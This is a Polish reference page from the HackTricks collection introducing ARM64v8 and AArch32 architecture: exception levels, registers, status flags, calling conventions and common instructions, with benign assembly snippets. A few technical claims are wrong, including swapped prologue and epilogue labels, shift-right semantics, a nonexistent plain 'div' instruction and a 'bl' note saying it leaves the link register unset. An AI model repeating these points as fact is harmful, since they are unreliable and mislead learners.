# Wprowadzenie do ARM64v8

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>

## **Poziomy Wyjątków - EL (ARM64v8)**

W architekturze ARMv8 poziomy wykonania, znane jako Poziomy Wyjątków (EL), definiują poziom uprzywilejowania i możliwości środowiska wykonawczego. Istnieją cztery poziomy wyjątków, od EL0 do EL3, z których każdy pełni inną funkcję:

1. **EL0 - Tryb Użytkownika**:
* Jest to najmniej uprzywilejowany poziom i służy do wykonywania zwykłego kodu aplikacji.
* Aplikacje działające na poziomie EL0 są izolowane od siebie nawzajem i od oprogramowania systemowego, zwiększając bezpieczeństwo i stabilność.
2. **EL1 - Tryb Jądra Systemu Operacyjnego**:
* Większość jąder systemów operacyjnych działa na tym poziomie.
* EL1 ma większe uprawnienia niż EL0 i może uzyskać dostęp do zasobów systemowych, ale z pewnymi ograniczeniami, aby zapewnić integralność systemu.
3. **EL2 - Tryb Hypervisora**:
* Ten poziom jest używany do wirtualizacji. Hypernadzorca działający na poziomie EL2 może zarządzać wieloma systemami operacyjnymi (każdy w swoim EL1) działającymi na tym samym sprzęcie fizycznym.
* EL2 zapewnia funkcje izolacji i kontroli środowisk zvirtualizowanych.
4. **EL3 - Tryb Monitora Bezpieczeństwa**:
* Jest to najbardziej uprzywilejowany poziom i często jest używany do bezpiecznego uruchamiania i zaufanych środowisk wykonawczych.
* EL3 może zarządzać i kontrolować dostępy między stanami bezpiecznymi i niebezpiecznymi (takimi jak bezpieczne uruchamianie, zaufany system operacyjny, itp.).

Wykorzystanie tych poziomów pozwala na strukturalne i bezpieczne zarządzanie różnymi aspektami systemu, począwszy od aplikacji użytkownika aż po najbardziej uprzywilejowane oprogramowanie systemowe. Podejście ARMv8 do poziomów uprzywilejowania pomaga w skutecznym izolowaniu różnych komponentów systemu, zwiększając tym samym bezpieczeństwo i niezawodność systemu.

## **Rejestry (ARM64v8)**

ARM64 ma **31 rejestrów ogólnego przeznaczenia**, oznaczonych jako `x0` do `x30`. Każdy może przechowywać wartość **64-bitową** (8 bajtów). Dla operacji wymagających tylko wartości **32-bitowych**, te same rejestry można uzyskać w trybie 32-bitowym, używając nazw w0 do w30.

1. **`x0`** do **`x7`** - Zazwyczaj są używane jako rejestry tymczasowe i do przekazywania parametrów do podprogramów.
* **`x0`** przenosi również dane zwracane przez funkcję.
2. **`x8`** - W jądrze Linuxa, `x8` jest używany jako numer wywołania systemowego dla instrukcji `svc`. **W macOS używany jest x16!**
3. **`x9`** do **`x15`** - Więcej rejestrów tymczasowych, często używanych do zmiennych lokalnych.
4. **`x16`** i **`x17` - Rejestry Wywołań Wewnątrzproceduralnych**. Rejestry tymczasowe dla wartości natychmiastowych. Są one również używane do pośrednich wywołań funkcji i osłon PLT (Procedure Linkage Table).
* **`x16`** jest używany jako **numer wywołania systemowego** dla instrukcji **`svc`** w **macOS**.
5. **`x18`** - **Rejestr platformy**. Może być używany jako rejestr ogólnego przeznaczenia, ale na niektórych platformach ten rejestr jest zarezerwowany dla zastosowań specyficznych dla platformy: wskaźnik do bieżącego bloku środowiska wątków w systemie Windows lub wskaźnik do bieżącej **struktury zadania wykonywanego w jądrze Linux**.
6. **`x19`** do **`x28`** - Są to rejestry zachowywane przez wywołanego. Funkcja musi zachować wartości tych rejestrów dla swojego wywołującego, dlatego są one przechowywane na stosie i przywracane przed powrotem do wywołującego.
7. **`x29`** - **Wskaźnik ramki** do śledzenia ramki stosu. Gdy tworzona jest nowa ramka stosu, ponieważ wywoływana jest funkcja, rejestr **`x29`** jest **przechowywany na stosie** a nowy adres ramki (**adres `sp`**) jest **przechowywany w tym rejestrze**.
* Ten rejestr może również być używany jako **rejestr ogólnego przeznaczenia**, chociaż zazwyczaj jest używany jako odniesienie do **zmiennych lokalnych**.
8. **`x30`** lub **`lr`** - **Rejestr łącza**. Przechowuje **adres powrotu** po wykonaniu instrukcji `BL` (Branch with Link) lub `BLR` (Branch with Link to Register), przechowując wartość **`pc`** w tym rejestrze.
* Może być również używany jak każdy inny rejestr.
* Jeśli bieżąca funkcja ma wywołać nową funkcję i tym samym nadpisać `lr`, zostanie ona przechowana na stosie na początku, jest to epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Przechowaj `fp` i `lr`, wygeneruj miejsce i uzyskaj nowy `fp`) i przywrócona na końcu, jest to prolog (`ldp x29, x30, [sp], #48; ret` -> Przywróć `fp` i `lr` i zwróć).
9. **`sp`** - **Wskaźnik stosu**, używany do śledzenia góry stosu.
* wartość **`sp`** powinna zawsze być zachowana co najmniej z **wyrównaniem na kwadro-słowo**, w przeciwnym razie może wystąpić wyjątek wyrównania.
10. **`pc`** - **Licznik programu**, który wskazuje na następną instrukcję. Ten rejestr może być aktualizowany tylko poprzez generowanie wyjątków, zwracanie wyjątków i skoki. Jedynymi zwykłymi instrukcjami, które mogą odczytać ten rejestr, są instrukcje skoku z linkiem (BL, BLR) do przechowywania adresu **`pc`** w rejestrze **`lr`** (Rejestr Łącza).
11. **`xzr`** - **Rejestr zerowy**. Nazywany również **`wzr`** w swojej formie rejestru **32**-bitowego. Może być używany do łatwego uzyskania wartości zerowej (częsta operacja) lub do wykonywania porównań za pomocą **`subs`** jak **`subs XZR, Xn, #10`** przechowując wynikowe dane nigdzie (w **`xzr`**).

Rejestry **`Wn`** to wersja **32-bitowa** rejestru **`Xn`**.

### Rejestry SIMD i Zmiennoprzecinkowe

Ponadto istnieje kolejnych **32 rejestry o długości 128 bitów**, które można używać w zoptymalizowanych operacjach jednoczesnego przetwarzania wielu danych (SIMD) i do wykonywania obliczeń zmiennoprzecinkowych. Są one nazywane rejestrami Vn, chociaż mogą również działać w trybie **64**-bitowym, **32**-bitowym, **16**-bitowym i **8**-bitowym, a wtedy są nazywane **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.
### Rejestry systemowe

**Istnieje setki rejestrów systemowych**, zwanych również rejestrami specjalnego przeznaczenia (SPR), które są używane do **monitorowania** i **kontrolowania** zachowania **procesorów**.\
Mogą być odczytywane lub ustawiane tylko za pomocą dedykowanej specjalnej instrukcji **`mrs`** i **`msr`**.

Specjalne rejestry **`TPIDR_EL0`** i **`TPIDDR_EL0`** są często spotykane podczas odwracania inżynierii. Przyrostek `EL0` wskazuje na **minimalny wyjątek**, z którego można uzyskać dostęp do rejestru (w tym przypadku EL0 to zwykły poziom wyjątku (uprzywilejowanie), na którym działają zwykłe programy).\
Są one często używane do przechowywania **bazowego adresu obszaru pamięci lokalnej wątku**. Zazwyczaj pierwszy jest czytelny i zapisywalny dla programów działających w EL0, ale drugi może być odczytywany z EL0 i zapisywany z EL1 (jak jądro).

* `mrs x0, TPIDR_EL0 ; Odczytaj TPIDR_EL0 do x0`
* `msr TPIDR_EL0, X0 ; Zapisz x0 do TPIDR_EL0`

### **PSTATE**

**PSTATE** zawiera kilka składowych procesu zserializowanych do widocznego w systemie operacyjnym specjalnego rejestru **`SPSR_ELx`**, gdzie X to **poziom uprawnień wywołanego** wyjątku (to pozwala na przywrócenie stanu procesu po zakończeniu wyjątku).\
Oto dostępne pola:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* Flagi warunkowe **`N`**, **`Z`**, **`C`** i **`V`**:
* **`N`** oznacza, że operacja dała wynik ujemny
* **`Z`** oznacza, że operacja dała zero
* **`C`** oznacza, że operacja została przeprowadzona
* **`V`** oznacza, że operacja dała przepełnienie ze znakiem:
* Suma dwóch liczb dodatnich daje wynik ujemny.
* Suma dwóch liczb ujemnych daje wynik dodatni.
* W odejmowaniu, gdy od mniejszej liczby dodatniej odejmowana jest większa liczba ujemna (lub odwrotnie), i wynik nie może być reprezentowany w zakresie podanej wielkości bitowej.
* Oczywiście procesor nie wie, czy operacja jest ze znakiem czy nie, więc sprawdzi C i V w operacjach i wskaże, czy wystąpił przeniesienie w przypadku operacji ze znakiem lub bez.

{% hint style="warning" %}
Nie wszystkie instrukcje aktualizują te flagi. Niektóre, takie jak **`CMP`** lub **`TST`**, tak robią, a inne, które mają przyrostek s, jak **`ADDS`**, również to robią.
{% endhint %}

* Bieżąca flaga **szerokości rejestru (`nRW`)**: Jeśli flaga ma wartość 0, program będzie działał w stanie wykonania AArch64 po wznowieniu.
* Bieżący **Poziom Wyjątku** (**`EL`**): Zwykły program działający w EL0 będzie miał wartość 0
* Flagi **jednokrokowego wykonywania** (**`SS`**): Używane przez debugery do jednokrokowego wykonywania poprzez ustawienie flagi SS na 1 wewnątrz **`SPSR_ELx`** poprzez wyjątek. Program wykona krok i wywoła wyjątek jednokrokowy.
* Flagi stanu wyjątku **nielegalnego** (**`IL`**): Służy do oznaczania, kiedy uprzywilejowane oprogramowanie wykonuje nieprawidłowy transfer poziomu wyjątku, ta flaga jest ustawiana na 1, a procesor wywołuje wyjątek stanu nielegalnego.
* Flagi **`DAIF`**: Te flagi pozwalają uprzywilejowanemu programowi selektywnie maskować pewne zewnętrzne wyjątki.
* Jeśli **`A`** wynosi 1, oznacza to, że zostaną wywołane **przerwania asynchroniczne**. **`I`** konfiguruje odpowiedź na zewnętrzne **żądania przerwań sprzętowych** (IRQ), a F jest związane z **szybkimi żądaniami przerwań** (FIR).
* Flagi wyboru wskaźnika stosu (**`SPS`**): Uprawnione programy działające w EL1 i wyżej mogą przełączać się między używaniem własnego rejestru wskaźnika stosu a rejestru modelu użytkownika (np. między `SP_EL1` a `EL0`). To przełączanie jest wykonywane poprzez zapisanie do specjalnego rejestru **`SPSel`**. Nie można tego zrobić z EL0.

## **Konwencja wywoływania (ARM64v8)**

Konwencja wywoływania ARM64 określa, że **pierwsze osiem parametrów** funkcji jest przekazywane w rejestrach **`x0` do `x7`**. **Dodatkowe** parametry są przekazywane na **stosie**. Wartość **zwracana** jest przekazywana z powrotem w rejestrze **`x0`**, lub również w **`x1`**, jeśli jest długa na **128 bitów**. Rejestry **`x19`** do **`x30`** oraz **`sp`** muszą być **zachowane** między wywołaniami funkcji.

Podczas czytania funkcji w asemblerze, należy szukać **prologu i epilogu** funkcji. **Prolog** zazwyczaj obejmuje **zapisanie wskaźnika ramki (`x29`)**, **ustawienie** nowego **wskaźnika ramki** i **przydzielenie miejsca na stosie**. **Epilog** zazwyczaj obejmuje **przywrócenie zapisanego wskaźnika ramki** i **powrót** z funkcji.

### Konwencja wywoływania w Swift

Swift ma swoją własną **konwencję wywoływania**, którą można znaleźć pod adresem [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Powszechne instrukcje (ARM64v8)**

Instrukcje ARM64 mają ogólnie **format `opcode dst, src1, src2`**, gdzie **`opcode`** to **operacja** do wykonania (takie jak `add`, `sub`, `mov`, itp.), **`dst`** to **rejestr docelowy**, w którym zostanie przechowany wynik, a **`src1`** i **`src2`** to **rejestry źródłowe**. Wartości natychmiastowe mogą również być używane zamiast rejestrów źródłowych.

* **`mov`**: **Przenieś** wartość z jednego **rejestru** do drugiego.
* Przykład: `mov x0, x1` — To przenosi wartość z `x1` do `x0`.
* **`ldr`**: **Załaduj** wartość z **pamięci** do **rejestru**.
* Przykład: `ldr x0, [x1]` — To ładuje wartość z lokalizacji pamięci wskazywanej przez `x1` do `x0`.
* **Tryb z przesunięciem**: Wskazuje przesunięcie wpływające na wskaźnik oryginału, na przykład:
* `ldr x2, [x1, #8]`, to załaduje do x2 wartość z x1 + 8
* &#x20;`ldr x2, [x0, x1, lsl #2]`, to załaduje do x2 obiekt z tablicy x0, z pozycji x1 (indeks) \* 4
* **Tryb z wstępnym indeksowaniem**: To zastosuje obliczenia do oryginału, uzyska wynik i przechowa nowy oryginał w oryginale.
* `ldr x2, [x1, #8]!`, to załaduje `x1 + 8` do `x2` i przechowa w x1 wynik `x1 + 8`
* `str lr, [sp, #-4]!`, Przechowuje rejestr łącza w sp i aktualizuje rejestr sp
* **Tryb z indeksowaniem po zakończeniu**: Jest podobny do poprzedniego, ale adres pamięci jest dostępny, a następnie obliczane i przechowywane jest przesunięcie.
* `ldr x0, [x1], #8`, załaduje `x1` do `x0` i zaktualizuje x1 na `x1 + 8`
* **Adresowanie względem PC**: W tym przypadku adres do załadowania jest obliczany względem rejestru PC
* `ldr x1, =_start`, To załaduje adres, gdzie zaczyna się symbol `_start` w x1 względem bieżącego PC.
* **`str`**: **Zapisz** wartość z **rejestru** do **pamięci**.
* Przykład: `str x0, [x1]` — To zapisuje wartość z `x0` do lokalizacji pamięci wskazywanej przez `x1`.
* **`ldp`**: **Załaduj parę rejestrów**. Ta instrukcja **ładuje dwa rejestry** z **kolejnych lokalizacji pamięci**. Adres pamięci zazwyczaj jest tworzony przez dodanie przesunięcia do wartości w innym rejestrze.
* Przykład: `ldp x0, x1, [x2]` — To ładuje `x0` i `x1` z lokalizacji pamięci w `x2` i `x2 + 8`, odpowiednio.
* **`stp`**: **Zapisz parę rejestrów**. Ta instrukcja **zapisuje dwa rejestry** do **kolejnych lokalizacji pamięci**. Adres pamięci zazwyczaj jest tworzony przez dodanie przesunięcia do wartości w innym rejestrze.
* Przykład: `stp x0, x1, [sp]` — To zapisuje `x0` i `x1` do lokalizacji pamięci w `sp` i `sp + 8`, odpowiednio.
* `stp x0, x1, [sp, #16]!` — To zapisuje `x0` i `x1` do lokalizacji pamięci w `sp+16` i `sp + 24`, odpowiednio, i aktualizuje `sp` na `sp+16`.
* **`add`**: **Dodaj** wartości dwóch rejestrów i przechowaj wynik w rejestrze.
* Składnia: add(s) Xn1, Xn2, Xn3 | #imm, \[przesunięcie #N | RRX\]
* Xn1 -> Cel
* Xn2 -> Operand 1
* Xn3 | #imm -> Operand 2 (rejestr lub natychmiastowa wartość)
* \[przesunięcie #N | RRX\] -> Wykonaj przesunięcie lub wywołaj RRX
* Przykład: `add x0, x1, x2` — Dodaje wartości w `x1` i `x2` i przechowuje wynik w `x0`.
* `add x5, x5, #1, lsl #12` — Równa się 4096 (1 przesunięte 12 razy) -> 1 0000 0000 0000 0000
* **`adds`** Wykonuje `add` i aktualizuje flagi
* **`sub`**: **Odejmij** wartości dwóch rejestrów i przechowaj wynik w rejestrze.
* Sprawdź **składnię `add`**.
* Przykład: `sub x0, x1, x2` — Odejmuje wartość w `x2` od `x1` i przechowuje wynik w `x0`.
* **`subs`** Jest to jak sub, ale aktualizuje flagi
* **`mul`**: **Pomnóż** wartości **dwóch rejestrów** i przechowaj wynik w rejestrze.
* Przykład: `mul x0, x1, x2` — Mnoży wartości w `x1` i `x2` i przechowuje wynik w `x0`.
* **`div`**: **Podziel** wartość jednego rejestru przez drugi i przechowaj wynik w rejestrze.
* Przykład: `div x0, x1, x2` — Dzieli wartość w `x1` przez `x2` i przechowuje wynik w `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Przesunięcie logiczne w lewo**: Dodaj 0 z końca, przesuwając inne bity do przodu (pomnóż n razy przez 2)
* **Przesunięcie logiczne w prawo**: Dodaj 1 z przodu, przesuwając inne bity do tyłu (dzielenie n razy przez 2 w przypadku liczb bez znaku)
* **Przesunięcie arytmetyczne w prawo**: Podobnie jak **`lsr`**, ale zamiast dodawania zer, jeśli najbardziej znaczący bit to 1, \*\*dodawane są 1 (\*\*dzielenie n razy przez 2 w przypadku liczb ze znakiem)
* **Obrót w prawo**: Podobnie jak **`lsr`**, ale to, co jest usuwane z prawej strony, jest dołączane z lewej
* **Obrót w prawo z rozszerzeniem**: Podobnie jak **`ror`**, ale z flagą przeniesienia jako "najbardziej znaczący bit". Więc flaga przeniesienia jest przenoszona do bitu 31, a usunięty bit do flagi przeniesienia.
* **`bfm`**: **Przeniesienie pola bitowego**, te operacje **kopiują bity `0...n`** z wartości i umieszczają je na pozycjach **`m..m+n`**. **`#s`** określa **najbardziej lewą pozycję bitu** a **`#r`** **ilość obrotu w prawo**.
* Przeniesienie pola bitowego: `BFM Xd, Xn, #r`
* Podpisane przeniesienie pola bitowego: `SBFM Xd, Xn, #r, #s`
* Niepodpisane przeniesienie pola bitowego: `UBFM Xd, Xn, #r, #s`
* **Wyciąganie i wstawianie pola bitowego:** Kopiowanie pola bitowego z rejestru i kopiowanie go do innego rejestru.
* **`BFI X1, X2, #3, #4`** Wstawia 4 bity z X2 od 3. bitu X1
* **`BFXIL X1, X2, #3, #4`** Wyciąga z 3. bitu X2 cztery bity i kopiuje je do X1
* **`SBFIZ X1, X2, #3, #4`** Rozszerza znak 4 bity z X2 i wstawia je do X1 zaczynając od pozycji bitu 3, zerując prawe bity
* **`SBFX X1, X2, #3, #4`** Wyciąga 4 bity zaczynając od bitu 3 z X2, rozszerza znak i umieszcza wynik w X1
* **`UBFIZ X1, X2, #3, #4`** Rozszerza zero 4 bity z X2 i wstawia je do X1 zaczynając od pozycji bitu 3, zerując prawe bity
* **`UBFX X1, X2, #3, #4`** Wyciąga 4 bity zaczynając od bitu 3 z X2 i umieszcza wynik z zerowaniem w X1.
* **Rozszerz znak do X:** Rozszerza znak (lub dodaje tylko zera w wersji bez znaku) wartości, aby można było wykonywać na niej operacje:
* **`SXTB X1, W2`** Rozszerza znak bajtu **z W2 do X1** (`W2` to połowa `X2`) wypełniając 64 bity
* **`SXTH X1, W2`** Rozszerza znak liczby 16-bitowej **z W2 do X1** wypełniając 64 bity
* **`SXTW X1, W2`** Rozszerza znak bajtu **z W2 do X1** wypełniając 64 bity
* **`UXTB X1, W2`** Dodaje zera (bez znaku) do bajtu **z W2 do X1** wypełniając 64 bity
* **`extr`:** Wyciąga bity z określonej **pary złączonych rejestrów**.
* Przykład: `EXTR W3, W2, W1, #3` To **połączy W1+W2** i pobierze **od bitu 3 z W2 do bitu 3 z W1** i przechowa w W3.
* **`cmp`**: **Porównaj** dwa rejestry i ustaw flagi warunkowe. Jest to **alias `subs`** ustawiający rejestr docelowy na zerowy rejestr. Przydatne do sprawdzenia, czy `m == n`.
* Obsługuje **tę samą składnię co `subs`**
* Przykład: `cmp x0, x1` — Porównuje wartości w `x0` i `x1` i ustawia odpowiednio flagi warunkowe.
* **`cmn`**: **Porównaj ujemny** operand. W tym przypadku jest to **alias `adds`** i obsługuje tę samą składnię. Przydatne do sprawdzenia, czy `m == -n`.
* **`ccmp`**: Porównanie warunkowe, jest to porównanie, które zostanie wykonane tylko wtedy, gdy poprzednie porównanie było prawdziwe, i będzie specjalnie ustawiać bity nzcv.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> jeśli x1 != x2 i x3 < x4, przejdź do funkcji
* Dzieje się tak, ponieważ **`ccmp`** zostanie wykonane tylko wtedy, gdy **poprzednie `cmp` było `NE`**, jeśli nie, bity `nzcv` zostaną ustawione na 0 (co nie spełni warunku `blt`).
* Można go również używać jako `ccmn` (to samo, ale ujemne, jak `cmp` vs `cmn`).
* **`tst`**: Sprawdza, czy któreś z wartości porównania to oba 1 (działa jak i ANDS bez przechowywania wyniku gdziekolwiek). Przydatne do sprawdzenia rejestru z wartością i sprawdzenia, czy którykolwiek z bitów rejestru wskazanego w wartości jest równy 1.
* Przykład: `tst X1, #7` Sprawdź, czy którykolwiek z ostatnich 3 bitów X1 to 1
* **`teq`**: Operacja XOR, odrzucająca wynik
* **`b`**: Bezwarunkowy skok
* Przykład: `b myFunction`&#x20;
* Należy zauważyć, że nie wypełni to rejestru łącza adresem powrotu (nieodpowiednie dla wywołań podprogramów, które muszą wrócić)
* **`bl`**: **Skok** z linkiem, używany do **wywołania** podprogramu. Przechowuje **adres powrotu w `x30`**.
* Przykład: `bl myFunction` — Wywołuje funkcję `myFunction` i przechowuje adres powrotu w `x30`.
* Należy zauważyć, że nie wypełni to rejestru łącza adresem powrotu (nieodpowiednie dla wywołań podprogramów, które muszą wrócić)
* **`blr`**: **Skok** z linkiem do rejestru, używany do **wywołania** podprogramu, gdzie cel jest **określony** w **rejestrze**. Przechowuje adres powrotu w `x30`. (To jest&#x20;
* Przykład: `blr x1` — Wywołuje funkcję, której adres jest zawarty w `x1` i przechowuje adres powrotu w `x30`.
* **`ret`**: **Powrót** z **podprogramu**, zwykle używając adresu w **`x30`**.
* Przykład: `ret` — To zwraca z bieżącego podprogramu, używając adresu powrotu w `x30`.
* **`b.<cond>`**: Warunkowe skoki
* **`b.eq`**: **Skok jeśli równy**, na podstawie poprzedniej instrukcji `cmp`.
* Przykład: `b.eq label` — Jeśli poprzednia instrukcja `cmp` znalazła dwie równe wartości, to skacze do `label`.
* **`b.ne`**: **Branch if Not Equal**. Ta instrukcja sprawdza flagi warunkowe (które zostały ustawione przez poprzednią instrukcję porównania) i jeśli porównywane wartości nie były równe, skacze do etykiety lub adresu.
* Przykład: Po instrukcji `cmp x0, x1`, `b.ne label` — Jeśli wartości w `x0` i `x1` nie były równe, następuje skok do `label`.
* **`cbz`**: **Porównaj i Skocz jeśli Zero**. Ta instrukcja porównuje rejestr z zerem i jeśli są równe, skacze do etykiety lub adresu.
* Przykład: `cbz x0, label` — Jeśli wartość w `x0` wynosi zero, następuje skok do `label`.
* **`cbnz`**: **Porównaj i Skocz jeśli Nie-Zero**. Ta instrukcja porównuje rejestr z zerem i jeśli nie są równe, skacze do etykiety lub adresu.
* Przykład: `cbnz x0, label` — Jeśli wartość w `x0` jest niezerowa, następuje skok do `label`.
* **`tbnz`**: Testuj bit i skacz jeśli niezerowy
* Przykład: `tbnz x0, #8, label`
* **`tbz`**: Testuj bit i skacz jeśli zero
* Przykład: `tbz x0, #8, label`
* **Operacje wyboru warunkowego**: Są to operacje, których zachowanie zależy od bitów warunkowych.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Jeśli prawda, X0 = X1, jeśli fałsz, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Jeśli prawda, Xd = Xn + 1, jeśli fałsz, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> Jeśli prawda, Xd = NOT(Xn), jeśli fałsz, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = - Xm
* `cneg Xd, Xn, cond` -> Jeśli prawda, Xd = - Xn, jeśli fałsz, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = 1, jeśli fałsz, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = \<wszystkie 1>, jeśli fałsz, Xd = 0
* **`adrp`**: Oblicz **adres strony symbolu** i zapisz go w rejestrze.
* Przykład: `adrp x0, symbol` — Oblicza adres strony `symbolu` i zapisuje go w `x0`.
* **`ldrsw`**: **Załaduj** podpisaną **wartość 32-bitową** z pamięci i **rozszerz ją do 64** bitów.
* Przykład: `ldrsw x0, [x1]` — Ładuje podpisaną wartość 32-bitową z lokalizacji pamięci wskazywanej przez `x1`, rozszerza ją do 64 bitów i zapisuje w `x0`.
* **`stur`**: **Zapisz wartość rejestru do lokalizacji pamięci**, używając przesunięcia od innego rejestru.
* Przykład: `stur x0, [x1, #4]` — Zapisuje wartość z `x0` do adresu pamięci, który jest o 4 bajty większy niż adres aktualnie w `x1`.
* **`svc`** : Wykonaj **wywołanie systemowe**. Oznacza "Supervisor Call". Gdy procesor wykonuje tę instrukcję, **przełącza się z trybu użytkownika na tryb jądra** i przechodzi do określonego miejsca w pamięci, gdzie znajduje się kod obsługi **wywołania systemowego jądra**.
*   Przykład:

```armasm
mov x8, 93  ; Załaduj numer wywołania systemowego dla wyjścia (93) do rejestru x8.
mov x0, 0   ; Załaduj kod stanu wyjścia (0) do rejestru x0.
svc 0       ; Wykonaj wywołanie systemowe.
```

### **Prolog Funkcji**

1. **Zapisz rejestr linku i wskaźnik ramki na stosie**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Ustaw nowy wskaźnik ramki**: `mov x29, sp` (ustawia nowy wskaźnik ramki dla bieżącej funkcji)
3. **Zaalokuj miejsce na stosie dla zmiennych lokalnych** (jeśli jest to potrzebne): `sub sp, sp, <size>` (gdzie `<size>` to liczba bajtów potrzebna)

### **Epilog Funkcji**

1. **Zwolnij zmienne lokalne (jeśli jakiekolwiek zostały zaalokowane)**: `add sp, sp, <size>`
2. **Przywróć rejestr linku i wskaźnik ramki**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Powrót**: `ret` (zwraca kontrolę do wywołującego, używając adresu w rejestrze łącza)

## Stan wykonania AARCH32

Armv8-A obsługuje wykonanie programów 32-bitowych. **AArch32** może działać w jednym z **dwóch zestawów instrukcji**: **`A32`** i **`T32`** oraz może przełączać się między nimi za pomocą **`interworking`**.\
**Uprawnione** programy 64-bitowe mogą zaplanować **wykonanie programów 32-bitowych** poprzez wykonanie transferu poziomu wyjątku do programu o niższych uprawnieniach 32-bitowych.\
Należy zauważyć, że przejście z 64-bitowego do 32-bitowego zachodzi z niższym poziomem wyjątku (na przykład program 64-bitowy w EL1 wywołujący program w EL0). Jest to realizowane poprzez ustawienie **bitu 4 rejestru specjalnego** **`SPSR_ELx`** na **1** gdy wątek procesu `AArch32` jest gotowy do wykonania, a reszta `SPSR_ELx` przechowuje stany **`AArch32`** programów CPSR. Następnie, uprzywilejowany proces wywołuje instrukcję **`ERET`** aby procesor przełączył się na **`AArch32`** wchodząc w A32 lub T32 w zależności od CPSR\*\*.\*\*

**`Interworking`** zachodzi za pomocą bitów J i T CPSR. `J=0` i `T=0` oznacza **`A32`** a `J=0` i `T=1` oznacza **T32**. W skrócie, ustawienie **najniższego bitu na 1** wskazuje, że zestaw instrukcji to T32.\
To jest ustawiane podczas **instrukcji skoku interworking**, ale może być również ustawione bezpośrednio za pomocą innych instrukcji, gdy PC jest ustawiony jako rejestr docelowy. Przykład:

Kolejny przykład:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejestry

Istnieje 16 rejestrów 32-bitowych (r0-r15). Od r0 do r14 mogą być używane do dowolnych operacji, jednak niektóre z nich są zazwyczaj zarezerwowane:

- `r15`: Licznik programu (zawsze). Zawiera adres następnej instrukcji. W A32 aktualny + 8, w T32 aktualny + 4.
- `r11`: Wskaźnik ramki
- `r12`: Rejestr wywołania wewnątrzproceduralnego
- `r13`: Wskaźnik stosu
- `r14`: Rejestr łącza

Ponadto rejestry są tworzone w **`rejestrach bankowych`**. Są to miejsca przechowujące wartości rejestrów, umożliwiające szybką zmianę kontekstu w obsłudze wyjątków i operacjach uprzywilejowanych, aby uniknąć konieczności ręcznego zapisywania i przywracania rejestrów za każdym razem. To jest realizowane poprzez **zapis stanu procesora z `CPSR` do `SPSR`** trybu procesora, do którego jest wykonywany wyjątek. Po powrocie z wyjątku, **`CPSR`** jest przywracany z **`SPSR`**.

### CPSR - Bieżący Rejestr Stanu Programu

W AArch32 CPSR działa podobnie jak **`PSTATE`** w AArch64 i jest również przechowywany w **`SPSR_ELx`** podczas przejęcia wyjątku w celu późniejszego przywrócenia wykonania:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Pola są podzielone na kilka grup:

- Rejestr Stanu Programu Aplikacji (APSR): Flagi arytmetyczne dostępne z EL0
- Rejestry Stanu Wykonania: Zachowanie procesu (zarządzane przez system operacyjny).

#### Rejestr Stanu Programu Aplikacji (APSR)

- Flagi **`N`**, **`Z`**, **`C`**, **`V`** (tak jak w AArch64)
- Flaga **`Q`**: Jest ustawiana na 1, gdy **następuje nasycenie liczb całkowitych** podczas wykonywania specjalnej instrukcji arytmetycznej nasycenia. Po ustawieniu na **`1`**, zachowuje wartość do momentu ręcznego ustawienia na 0. Ponadto nie ma żadnej instrukcji, która sprawdza jego wartość w sposób domyślny, musi być odczytana ręcznie.
- **`GE`** (Większe lub równe) Flagi: Są używane w operacjach SIMD (Single Instruction, Multiple Data), takich jak "dodawanie równoległe" i "odejmowanie równoległe". Te operacje pozwalają przetwarzać wiele punktów danych w pojedynczej instrukcji.

